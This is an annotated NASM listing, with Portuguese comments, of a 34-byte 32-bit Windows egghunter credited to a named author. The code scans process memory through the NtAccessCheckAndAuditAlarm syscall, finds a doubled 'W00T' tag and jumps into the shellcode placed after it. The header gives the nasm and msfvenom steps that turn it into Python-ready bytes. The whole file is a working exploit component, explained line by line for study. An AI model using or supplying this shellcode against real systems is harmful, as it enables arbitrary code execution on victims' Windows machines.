     1                                  [BITS 32]
     2                                  
     3                                  ; EggHunter usando a função NtAccessCheckAndAuditAlarm
     4                                  ; Autor: Helvio Junior (M4v3r1cK)
     5                                  ;
     6                                  ; Procedimento de compilação do EggHunter
     7                                  ; nasm egghunter1.asm -o egghunter -l egghunter.lst
     8                                  ; cat egghunter | msfvenom -p - -a x86 --platform win -e generic/none -f python
     9                                  ;
    10                                  ; 34 bytes egghunter
    11                                  
    12                                  _start:
    13 00000000 89CA                        mov edx,ecx             ; Copia o endereço de EXC para EDX
    14                                                              ; para que seja definido manualmente o endereço inicial da busca
    15 00000002 EB06                        jmp loop_check          ; salta para a checagem
    16                                  
    17                                  loop_inc_page:
    18 00000004 6681CAFF0F                  or dx,0x0fff            ; adiciona 4KB ao endereço do EDX
    19                                  
    20                                  loop_inc_one:
    21 00000009 42                          inc edx                 ; atua como um contador
    22                                                              ; incrementa 1 ao valor de EDX
    23                                  
    24                                  loop_check:                 ; checa o endereço atual
    25 0000000A 52                          push edx                ; coloca (PUSH) EDX na pilha
    26 0000000B 6A02                        push byte +0x2          ; coloca 0x2 na pilha 
    27                                                              ; use o 0x02 para NtAccessCheckAndAuditAlarm
    28                                                              ; ou use 0x43 para NtDisplayString
    29 0000000D 58                          pop eax                 ; retira 0x02 ou 0x43 da pilha e o coloca em EAX
    30                                                              ; desta forma este valor é utilizado como parâmetro do syscall
    31 0000000E CD2E                        int 0x2e                ; realiza um System call (para o kernel) usando o registro EAX
    32 00000010 3C05                        cmp al,0x5              ; checa de ocorreu uma violação de acesso
    33                                                              ; (0xc0000005== ACCESS_VIOLATION) 5
    34 00000012 5A                          pop edx                 ; restaura o edx
    35 00000013 74EF                        je loop_inc_page        ; caso tenho ocorrido uma violação de acesso (erro), salta para 'loop_inc_page'
    36                                                              ; que irá adicionar 4KB a página e continuar a checagem
    37                                  
    38                                  is_the_egg:
    39 00000015 B854303057                  mov eax,0x57303054      ; este é o EGG, ou seja o texto que estamos procurando (W00T)
    40 0000001A 89D7                        mov edi,edx             ; define EDI para nosso endereço de memória
    41 0000001C AF                          scasd                   ; compara EAX com o conteúdo de EDI (que é o conteúdo do EDX)
    42 0000001D 75EA                        jnz loop_inc_one        ; checa se são iguais, caso não, salta para loop_inc_one
    43                                                              ; caso sejam simplesmente continua a execução indo para o próximo passo
    44 0000001F AF                          scasd                   ; realiza a checagem do proximo endereçamento de memória EDX + 4, para checar o segundo EGG
    45 00000020 75E7                        jnz loop_inc_one        ; checa se são iguais, caso não, salta para loop_inc_one
    46                                                              ; caso sejam simplesmente continua a execução indo para o próximo passo
    47                                  
    48                                  matched:
    49 00000022 FFE7                        jmp edi                 ; EDI aponta para o início do shellcode
    50                                                              ; realiza um JMP para o shellcode
